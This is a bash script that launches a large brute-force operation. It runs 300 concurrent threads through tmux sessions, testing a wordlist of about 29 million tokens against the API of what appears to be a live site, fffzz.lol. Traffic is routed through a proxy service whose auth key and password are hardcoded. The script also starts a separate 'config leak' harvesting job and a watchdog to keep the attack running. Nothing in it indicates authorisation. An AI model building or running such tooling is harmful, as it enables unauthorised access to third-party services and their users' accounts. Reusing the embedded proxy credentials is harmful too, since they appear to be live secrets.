#!/bin/bash
# MAX SPEED: 20 channels x 15 threads = 300 concurrent
set -euo pipefail

OUT=/data/automation/results/fffzz.lol/kami_allin_20260717
BIN=/data/automation/bin
WL=/data/wordlists/faka/faka-tokens.txt
TOTAL=29452734
WORKERS=20
THREADS=15
CHUNK=$((TOTAL / WORKERS))

export QG_AUTHKEY="${QG_AUTHKEY:-C413ED6D}"
export QG_AUTHPWD="${QG_AUTHPWD:-344F550A6F8B}"
export QG_CHANNELS=20
export FFFZZ_TURBO=1
export FFFZZ_TIMEOUT=5

mkdir -p "$OUT" "$BIN"
cp /tmp/fffzz_api_brute_fast.py "$BIN/" 2>/dev/null || true
cp /tmp/qg-proxy-warm.sh "$BIN/" 2>/dev/null || true
cp /tmp/fffzz_watchdog.sh "$BIN/" 2>/dev/null || true
chmod +x "$BIN/qg-proxy-warm.sh" "$BIN/fffzz_watchdog.sh" 2>/dev/null || true
bash "$BIN/qg-proxy-warm.sh" "$OUT" 2>/dev/null || true

for s in $(tmux ls 2>/dev/null | grep -E '^ff-cn-' | cut -d: -f1); do
  tmux kill-session -t "$s" 2>/dev/null || true
done

for w in $(seq 0 $((WORKERS - 1))); do
  START=$((w * CHUNK))
  tmux new-session -d -s "ff-cn-api-$w" \
    "QG_AUTHKEY=$QG_AUTHKEY QG_AUTHPWD=$QG_AUTHPWD FFFZZ_TURBO=1 FFFZZ_TIMEOUT=5 python3 $BIN/fffzz_api_brute_fast.py $WL $START $CHUNK $THREADS $w $OUT 2>&1 | tee -a $OUT/cn_api_w${w}.log"
  sleep 0.2
done

PRI=/data/wordlists/faka/fffzz-priority.txt
HEX=/data/wordlists/faka/fffzz-hex32-sample.txt
[ -f "$PRI" ] && tmux new-session -d -s ff-cn-priority \
  "QG_AUTHKEY=$QG_AUTHKEY QG_AUTHPWD=$QG_AUTHPWD FFFZZ_TURBO=1 python3 $BIN/fffzz_api_brute_fast.py $PRI 0 0 25 99 $OUT 2>&1 | tee -a $OUT/cn_priority.log"
[ -f "$HEX" ] && tmux new-session -d -s ff-cn-hex32 \
  "QG_AUTHKEY=$QG_AUTHKEY QG_AUTHPWD=$QG_AUTHPWD FFFZZ_TURBO=1 python3 $BIN/fffzz_api_brute_fast.py $HEX 0 0 25 98 $OUT 2>&1 | tee -a $OUT/cn_hex32.log"

tmux new-session -d -s ff-cn-leak \
  "python3 $BIN/fffzz_config_leak.py $OUT 2>&1 | tee -a $OUT/cn_config_leak.log"
tmux new-session -d -s ff-cn-watch "WORKERS=20 THREADS=15 bash $BIN/fffzz_watchdog.sh"

echo "MAX: ${WORKERS}x${THREADS}=$((WORKERS*THREADS)) turbo + pri/hex x25 timeout=5s"
tmux ls | grep ff-cn
